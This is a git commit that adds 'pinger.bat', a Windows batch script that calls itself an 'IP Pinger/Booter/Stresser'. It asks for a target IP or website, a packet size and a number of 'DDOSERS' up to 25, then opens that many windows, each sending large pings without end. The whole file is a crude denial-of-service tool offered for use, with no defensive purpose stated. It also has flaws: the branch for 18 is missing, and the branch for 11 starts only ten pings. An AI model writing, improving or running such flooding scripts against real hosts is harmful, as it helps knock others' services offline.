106a44cc2858df9f9519dc99071509dc3ed1d924
Twyz <100242395+codetwyz@users.noreply.github.com>
2022-03-06 00:19:05 +0100

    Create pinger.bat

---
+++ pinger.bat
@@ -0,0 +1,387 @@
+@echo off
+Title IP Pinger/Booter/Stresser
+color 2
+echo ===============================================================================
+echo =                                 IP PINGER                                    =
+echo ===============================================================================
+set /p D= IP/WEBSITE: 
+ 
+:START
+color 0e
+cls
+echo (Max Amount 65500)
+echo.
+set /p O= PACKET SIZE: 
+ 
+color 0c
+cls
+echo ===============================================================================
+echo =                          Use At Your Own Risk!                              =
+echo ===============================================================================
+echo (Max Amount 25) 
+echo.
+set /p S= HOW MAN DDOSERS: 
+cls
+goto %S%
+pause 
+ 
+:1
+start ping %D% -t -l %O%
+goto START
+:2
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:3
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:4
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:5
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:6
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:7
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:8
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:9
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:10
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:11
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:12
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:13
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:14
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:15
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:16
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:17
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:19
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:20
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:21
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:22
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+ 
+:23
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+ 
+:24
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+ 
+:25
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+start ping %D% -t -l %O%
+goto START
+:END
+echo
+
